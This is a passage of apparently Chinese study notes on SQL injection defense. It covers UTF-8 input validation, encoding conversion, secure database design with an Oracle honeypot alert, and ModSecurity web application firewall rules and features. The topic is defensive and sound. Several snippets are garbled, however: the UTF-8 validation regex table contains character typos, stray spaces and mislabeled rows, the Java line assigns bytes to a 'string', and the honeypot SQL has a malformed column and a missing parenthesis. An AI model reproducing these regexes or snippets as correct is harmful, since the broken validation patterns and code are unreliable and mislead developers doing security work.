&lt;p&gt;还有一种方法是首先检查Unicode是有效的，然后将数据转换成一种可预见的格式，例如像ISO-8859-1这样的西欧字符集。&lt;/p&gt;
&lt;p&gt;用于解析UTF-8的正则表达式&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th align=&#34;center&#34;&gt;正则表达式&lt;/th&gt;
&lt;th align=&#34;center&#34;&gt;描   述&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;[x00-\x7F]&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;ASCII&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;[\xC2-\xDF][\x80-\xBF]&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;双字节表示&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;\xE0[\xA0-\xBF][\x80-\xBF]&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;双字节表示&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;[\xEl-\xEC\xEE\xEF][\x80-\xBF] {2}&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;三字节表示&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;\xED [\x80-\x9F][\x80-\xBF]&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;三字节表示&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;\xFO [\x90-\xBF][\x80-\xBF] {2}&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;plane 1 至ij 3&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;[\xF 1 -\xF3][\x80-\xBF] {3}&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;panel 4 到 15&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;\xF4 [\x80-\x8F][\x80-\xBF] {2}&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;panel 16&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;p&gt;检查完输入是有效的格式后，现在可以将它转换成可预见的格式。&lt;/p&gt;
&lt;p&gt;在Java中，可以使用CharsetEncoder类或比较简单的getBytes()方法（Java 6及之后的版本）&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-java&#34; data-language=&#34;java&#34;&gt;&lt;code class=&#34;language-java&#34;&gt;string ascii &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; utf8&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;getBytes&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;ISO-8859-1&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;在C#中，可以使用Encoding.Converter类&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-C#&#34; data-language=&#34;C#&#34;&gt;&lt;code class=&#34;language-C#&#34;&gt;byte[] asciiBytes = Encoding.Convert(Encoding.UTF8,Encoding.ASCII,utf8Bytes);&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;在PHP中，可以使用utf8_decode&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-php&#34; data-language=&#34;php&#34;&gt;&lt;code class=&#34;language-php&#34;&gt;ascii &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;utf8_decode&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$utf8string&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;通过设计来避免SQL注入的危险&#34;&gt;&lt;a href=&#34;#通过设计来避免SQL注入的危险&#34; class=&#34;headerlink&#34; title=&#34;通过设计来避免SQL注入的危险&#34;&gt;&lt;/a&gt;通过设计来避免SQL注入的危险&lt;/h3&gt;&lt;h4 id=&#34;使用储存过程&#34;&gt;&lt;a href=&#34;#使用储存过程&#34; class=&#34;headerlink&#34; title=&#34;使用储存过程&#34;&gt;&lt;/a&gt;使用储存过程&lt;/h4&gt;&lt;p&gt;在大多数数据库中使用存储过程时都可以在数据库层配置访问控制。通过正确配置许可权限来保证攻击者无法访问数据库中的敏感信息。&lt;/p&gt;
&lt;h4 id=&#34;使用抽象层&#34;&gt;&lt;a href=&#34;#使用抽象层&#34; class=&#34;headerlink&#34; title=&#34;使用抽象层&#34;&gt;&lt;/a&gt;使用抽象层&lt;/h4&gt;&lt;p&gt;表示、业务逻辑和数据访问定义不同的层，从而将每一层的实现从总体设计中抽象出来。&lt;/p&gt;
&lt;h4 id=&#34;处理敏感数据&#34;&gt;&lt;a href=&#34;#处理敏感数据&#34; class=&#34;headerlink&#34; title=&#34;处理敏感数据&#34;&gt;&lt;/a&gt;处理敏感数据&lt;/h4&gt;&lt;p&gt;考虑数据库中敏感信息的存储和访问。&lt;/p&gt;
&lt;p&gt;口令：如果可能的话，不应该在数据库中存储用户口令。比较安全的做法是存储每个用户口令的加盐（salted）单向哈希（使用SHA256这样的安全哈希算法）而不是口令本身。&lt;/p&gt;
&lt;p&gt;信用卡及其他财务信息：应该使用认可的（比如FIPS认证过的）加密算法来对信用卡等信息进行加密，然后存储加密后的明细数据。&lt;/p&gt;
&lt;p&gt;存档：如果未要求应用程序保存提交给它的所有敏感信息（例如个人可识别的信息）的完整历史记录，就应考虑每隔一段合理的时间就存档或清除这些不需要的信息。&lt;/p&gt;
&lt;h4 id=&#34;避免明显的对象名&#34;&gt;&lt;a href=&#34;#避免明显的对象名&#34; class=&#34;headerlink&#34; title=&#34;避免明显的对象名&#34;&gt;&lt;/a&gt;避免明显的对象名&lt;/h4&gt;&lt;p&gt;为关键对象（比如加密函数、口令列和信用卡列）选取名称时应该 格外小心，不要选取易被拆解的名字，如passwd&lt;/p&gt;
&lt;h4 id=&#34;创建honeypot-蜜罐&#34;&gt;&lt;a href=&#34;#创建honeypot-蜜罐&#34; class=&#34;headerlink&#34; title=&#34;创建honeypot(蜜罐)&#34;&gt;&lt;/a&gt;创建honeypot(蜜罐)&lt;/h4&gt;&lt;p&gt;如果希望在有人尝试从数据库读取口令时收到警告，可以创建一种带password列（包含假数据）的附加honeypot（蜜罐）表。如果假数据被选中，那么应用管理员将会收到一封e-mail。&lt;/p&gt;
&lt;p&gt;在 Oracle中，可以使用虚拟专用数据库（Virtual Private Database, VPD）来实现&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token comment&#34;&gt;--创建蜜罐表&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;create&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;table&lt;/span&gt; app_user&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;tblusers &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;is&lt;/span&gt; number&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; name varchar2&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;30&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; password varchar2 &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;30&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;--创建向管理员发送e-mail的策略函数&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;--必须用另外一个模式来创建该函数，比如secuser&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;create&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;or&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;replace&lt;/span&gt; secuser&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt; get_cust_id
p_schema &lt;span class=&#34;token operator&#34;&gt;in&lt;/span&gt; varchar2&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;
p_table &lt;span class=&#34;token operator&#34;&gt;in&lt;/span&gt; varchar2
&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; varchar2
&lt;span class=&#34;token keyword&#34;&gt;as&lt;/span&gt;
v_connection UTL_SMTP&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;CONNECTION&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;begin&lt;/span&gt;
v_connection :&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; UTL_SMTP&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;OPEN_CONNECTION&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;mailhost.victim.com&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;25&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
UTL_SMTP&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;HELO&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;v_connection&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;mailhost.victim.com&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
UTL_SMTP&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;MAIL&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;v_connection&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;app@victim.com&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
UTL_SMTP&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;RCPT&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;v_connection&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;admin@victim.com&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
UTL_SMTP&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;DATA&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;v_connection&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;WARNING! SELECT PERFORMED ON HONEYPOT&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; 
UTL_SMTP&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;QUIT&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;v_connection&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;1=1&#39;&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;--总是显示整个表&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;end&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;--将策略函数赋值给蜜罐表TBLUSERS&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;exec&lt;/span&gt; dbms_rls&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;add_policy &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;
&lt;span class=&#34;token string&#34;&gt;&#39;APP_USER&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;
&lt;span class=&#34;token string&#34;&gt;&#39;TBLUSERS&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;
&lt;span class=&#34;token string&#34;&gt;&#39;GET_CUST_ID&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;
&lt;span class=&#34;token string&#34;&gt;&#39;SECUSER&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;
&lt;span class=&#34;token string&#34;&gt;&#39;&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;
&lt;span class=&#34;token string&#34;&gt;&#39;SELECT, INSERT, UPDATE, DELETE&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&#34;附加的安全开发资源&#34;&gt;&lt;a href=&#34;#附加的安全开发资源&#34; class=&#34;headerlink&#34; title=&#34;附加的安全开发资源&#34;&gt;&lt;/a&gt;附加的安全开发资源&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;OWASP(Open Web Application Security Project，开放式 Web 应用安全项目&lt;a href=&#34;http://www.owasp.org/&#34;&gt;owasp&lt;/a&gt; &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;CWE/SANS 2009 年度25大最危险编程错误(&lt;a href=&#34;http://cwe.mitre.org/top25/index.html)%E6%98%AF&#34;&gt;http://cwe.mitre.org/top25/index.html)是&lt;/a&gt; MITRE (SANS协会)和许多高级安全专家通力合作的成果&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;SANS软件安全协会(&lt;a href=&#34;http://www.sans-ssi.org)提供了安全开发方面的培训和证书,以及大量由sans认证检验员提供的参考信息和研究资料./&#34;&gt;www.sans-ssi.org)提供了安全开发方面的培训和证书，以及大量由SANS认证检验员提供的参考信息和研究资料。&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Oracle 的 SQL 注入攻击防御指南(&lt;a href=&#34;http://st-curriculum.oracle.com/tutorial/SQLInjection/index.htm)%E4%BB%8B%E7%BB%8D%E4%BA%86%E5%BE%88%E5%A4%9A%E6%9C%89%E5%8A%A9%E4%BA%8E%E5%85%8D%E5%8F%97SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E7%9A%84%E5%B7%A5%E5%85%B7%E5%92%8C%E6%8A%80%E6%9C%AF%E3%80%82&#34;&gt;http://st-curriculum.oracle.com/tutorial/SQLInjection/index.htm)介绍了很多有助于免受SQL注入攻击的工具和技术。&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;SQLSecurity.com(&lt;a href=&#34;http://www.sqlsecurity.com)是一个致力于/&#34;&gt;www.sqlsecurity.com)是一个致力于&lt;/a&gt; Microsoft SQL Server 安全的站点&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Red-Database-Security(&lt;a href=&#34;http://www.red-database-security.com是一个专门研究/&#34;&gt;www.red-database-security.com是一个专门研究&lt;/a&gt; Oracle 安全的公司。它的网站上包含了很多可供下载的关于Oracle安全的报告和白皮书。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Pete Finnegan Limited(&lt;a href=&#34;http://petefinnigan.com)也提供了大量用于保证/&#34;&gt;http://petefinnigan.com)也提供了大量用于保证&lt;/a&gt; Oracle 数据库安全的信息。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;平台层防御&#34;&gt;&lt;a href=&#34;#平台层防御&#34; class=&#34;headerlink&#34; title=&#34;平台层防御&#34;&gt;&lt;/a&gt;平台层防御&lt;/h2&gt;&lt;h3 id=&#34;使用运行时保护&#34;&gt;&lt;a href=&#34;#使用运行时保护&#34; class=&#34;headerlink&#34; title=&#34;使用运行时保护&#34;&gt;&lt;/a&gt;使用运行时保护&lt;/h3&gt;&lt;h4 id=&#34;Web应用防火墙&#34;&gt;&lt;a href=&#34;#Web应用防火墙&#34; class=&#34;headerlink&#34; title=&#34;Web应用防火墙&#34;&gt;&lt;/a&gt;Web应用防火墙&lt;/h4&gt;&lt;p&gt;Web应用防火墙（WAF）是一种网络设备或是一种将安全特性添加到Web应用的基于软件的解决方案。&lt;/p&gt;
&lt;p&gt;基于软件的WAF通常是一些以最小化配置嵌入到Web服务器或应用程序中的模块，它们的主要好处是Web基础结构仍保持不变，并且能够无缝地处理HTTP/HTTPS通信，因为它们运行在承载Web或应用程序的进程中。&lt;/p&gt;
&lt;p&gt;WAF 的事实标准是开源的 &lt;a href=&#34;http://www.modsecurity.org/&#34;&gt;ModSecurity&lt;/a&gt;.ModSecurity被开发成 Apache的一个模块。如果将Apache Web服务器配置成反向代理，那么ModSecurity实际上可以保护任何Web应用，可以使用ModSecurity来实现攻击预防、监控、入侵检测和一般的应用程序加固。&lt;/p&gt;
&lt;p&gt;我们将使用ModSecurity作为主要的例子来介绍使用WAF时在检测并预防SQL注入方面的主要特征。&lt;/p&gt;
&lt;h5 id=&#34;可配置规则集&#34;&gt;&lt;a href=&#34;#可配置规则集&#34; class=&#34;headerlink&#34; title=&#34;可配置规则集&#34;&gt;&lt;/a&gt;可配置规则集&lt;/h5&gt;&lt;p&gt;WAF必须高度可配置才能适应各种不同的情况。&lt;/p&gt;
&lt;p&gt;ModSecurity的威力在于它的规则语言上，这种语言是配置指令和应用到HTTP请求和响应的一种简单编程语言的组合。ModSecurity的SecRule 指令的通用语法，如下所示：&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-SecRules&#34; data-language=&#34;SecRules&#34;&gt;&lt;code class=&#34;language-SecRules&#34;&gt;SecRule VARIABLE OPERATOR [ACTIONS]&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;VARIABLE属性告诉ModSecurity到哪里访问请求或响应，OPERATOR属性告诉ModSecurity如何检查数据，ACTIONS属性确定出现匹配时做哪些操作。ACTIONS属性是可选的规则选项， 它可以定义默认的全局动作。&lt;/p&gt;
&lt;p&gt;ModSecurity核心规则集(ModSecurity Core Rule Set)的 Generic Attacks 规则文件(modsecurity_crs_40_generic_attacks.conf)中的一条实际的黑名单SQL注入规则&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-markup&#34; data-language=&#34;markup&#34;&gt;&lt;code class=&#34;language-markup&#34;&gt;&amp;lt;Location /apps/script.php&amp;gt;
SecRule &amp;amp;ARGS &#34;!@eq 1&#34;
SecRule ARGS_NAMES &#34;!Astatid$&#34;
SecRule ARGS:statID &#34;!^\d{1,3}$&#34;
&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;/&lt;/span&gt;Location&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h5 id=&#34;请求覆盖范围&#34;&gt;&lt;a href=&#34;#请求覆盖范围&#34; class=&#34;headerlink&#34; title=&#34;请求覆盖范围&#34;&gt;&lt;/a&gt;请求覆盖范围&lt;/h5&gt;&lt;p&gt;攻击有效载荷可以出现在HTTP请求的任何位置，比如查询字符串、POST数据、cookie、自定义的或是标准的HTTP头(例如,Referer, Server等)，以及URL路径的部分内容中。ModSecurity能够处理所有这些情况。下面列出了 ModSecurity支持的变量列表&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;REQUEST BASENAME
REQUEST BODY
REQUEST BODY LENGTH
REQUEST COOKIES
REQUEST COOKIES NAMES
REQUEST FILENAME
REQUEST HEADERS
REQUEST HEADERS NAMES
REQUEST LINE
REQUEST METHOD
REQUEST PROTOCOL
REQUEST URI
REQUEST URI RAW&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h5 id=&#34;请求标准化&#34;&gt;&lt;a href=&#34;#请求标准化&#34; class=&#34;headerlink&#34; title=&#34;请求标准化&#34;&gt;&lt;/a&gt;请求标准化&lt;/h5&gt;&lt;p&gt;ModSecurity能够应对任何复杂的编码场景。它支持大量转换函数，可以将这些函数按任意顺序多次应用到每条规则上。下面列出了 ModSecurity参考手册中的转换函数&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;base64Decode
base64DecodeExt
base64Encode
cmdLine
compressWhitespace
cssDecode
escapeSeqDecode
hexDecode
hexEncode
htmlEntityDecode
jsDecode
length
lowercase
md5
none
normalisePath
normalisePathwin
parityEven7bit
parityodd7bit
parityzero7bit
removeNulls
removeWhitespace
replaceComments
removeCommentsChar
removeComments
replaceNulls
urlDecode
urlDecodeUni
urlEncode
sha1&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;如果内置函数因为某个原因无法满足需求，可以使用ModSecurity支持的Lua脚本语言来构建自定义的转换函数。&lt;/p&gt;
&lt;h5 id=&#34;响应分析&#34;&gt;&lt;a href=&#34;#响应分析&#34; class=&#34;headerlink&#34; title=&#34;响应分析&#34;&gt;&lt;/a&gt;响应分析&lt;/h5&gt;&lt;p&gt;抑制关键信息泄露，比如详细的SQL错误消息。&lt;/p&gt;
&lt;p&gt;ModSecurity核心规则集的Outbound规则文件(modsecurity_ crs_50_ outbound.conf)中的一条实际的带外(outbound)规则&lt;/p&gt;
&lt;p&gt;如果响应中的消息成功匹配了正则表达式(表明产生了SQL错误)，ModSecurity可以做出适当的响应，比如禁止将错误返回给攻击者，或者提供替换的错误编码或错误消息以迷惑自动客户端和扫描器。&lt;/p&gt;
&lt;h5 id=&#34;入侵检测能力&#34;&gt;&lt;a href=&#34;#入侵检测能力&#34; class=&#34;headerlink&#34; title=&#34;入侵检测能力&#34;&gt;&lt;/a&gt;入侵检测能力&lt;/h5&gt;&lt;p&gt;WAF应该可以被动监视应用的行为，遇到可疑的行为时能采用行动，并能在SQL注入事件之后为取证分析(forensic analysis)保持一个不可否认的事件日志。&lt;/p&gt;
&lt;p&gt;使用ModSecurity可以阻止SQL注入攻击、修复已知的SQL注入漏洞、检测攻击企图并抑制那些通常会为SQL注入漏洞利用提供便利的SQL错误消息。&lt;/p&gt;
&lt;h4 id=&#34;截断过滤器&#34;&gt;&lt;a href=&#34;#截断过滤器&#34; class=&#34;headerlink&#34; title=&#34;截断过滤器&#34;&gt;&lt;/a&gt;截断过滤器&lt;/h4&gt;&lt;p&gt;过滤器是WAF的独立模块，可添加新过滤器&lt;/p&gt;
&lt;p&gt;过滤器适合执行跨请求和响应（与核心应用逻辑是松耦合）的集中的、可重复的任务。过滤器还适用于输入验证、将请求/响应记录到日志以及转换输出响应等安全功能。&lt;/p&gt;
&lt;h5 id=&#34;Web服务器过滤器&#34;&gt;&lt;a href=&#34;#Web服务器过滤器&#34; class=&#34;headerlink&#34; title=&#34;Web服务器过滤器&#34;&gt;&lt;/a&gt;Web服务器过滤器&lt;/h5&gt;&lt;p&gt;可以将过滤器实现成Web服务器模块/插件，它们能对核心请求和响应进行扩展以便处理 Web服务器平台的API。Apache、 Netscape（Oracle/Sun）、IIS（Intemet信息服务）等流行的Web服务器平台均支持这种架构。&lt;/p&gt;
&lt;p&gt;ModSecurity是一种能够提供相当多的SQL注入保护的Apache API模块。UrlScan和WebKnight，它们是集成到IIS Web服务器平台的ISAPI过滤器，能够提供SQL注入保护。&lt;/p&gt;
&lt;h5 id=&#34;应用程序过滤器&#34;&gt;&lt;a href=&#34;#应用程序过滤器&#34; class=&#34;headerlink&#34; title=&#34;应用程序过滤器&#34;&gt;&lt;/a&gt;应用程序过滤器&lt;/h5&gt;&lt;p&gt;也可以使用Web应用的编程语言或框架来实现过滤器。其架构与Web服务器插件的架构类似：模块代码在请求和响应经历一系列阶段的过程时执行。可以使用ASP.NET的 System.Web.IHttpModule和javax.servlet.Filter接口来实现过滤器模式，之后可以在不修改代码的前提下将它们添加到应用中并在应用程序的配置文件中显式地激活它们。&lt;/p&gt;
